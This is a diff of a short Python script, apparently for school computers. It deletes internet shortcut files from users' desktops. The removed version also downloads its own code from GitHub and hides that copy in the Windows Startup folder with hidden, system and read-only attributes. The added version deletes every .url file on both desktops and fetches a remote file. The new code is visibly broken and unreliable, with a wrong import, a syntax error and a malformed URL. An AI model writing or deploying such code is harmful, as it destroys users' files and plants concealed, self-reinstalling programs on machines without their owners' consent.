@@ -1,19 +1,18 @@
 import os
+import request
 
-os.system("title Desktop.exe")
+path = os.path.abspath(__file__)
 
-paths = ["%userprofile%/Desktop/", "%public%/Desktop/"]
+dirs = ["%userprofile%/Desktop/", "%public%/Desktop/"]
 
-for path in paths:
-    os.system(f"cd {path}")
-    os.system("del Landguiden.url")
-    os.system("del www.studi.se.url")   
+for dir in dirs:
+    files = os.listdir(dir)
+    for file in files:
+        if file.endswith(".url"):
+            os.remove(os.path.join(dir, file))
+            print(f"deleted {file}")
 os.system("cls")
 
-os.system("cd %temp%")
-os.system("curl -OL https://raw.githubusercontent.com/thekevie/school-programs/main/desktop.py")
-os.system("cd %userprofile%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup")
-os.system("attrib -h -s -r desktop.py")
-os.system("copy /y %temp%\desktop.py desktop.py")
-os.system("del /q /f %temp%\desktop.py")
-os.system("attrib +h +s +r desktop.py")
+with open(path) as f
+	content = f.read()
+r = requests.get("https://github.com/thekevie/school-programs/desktop.py")
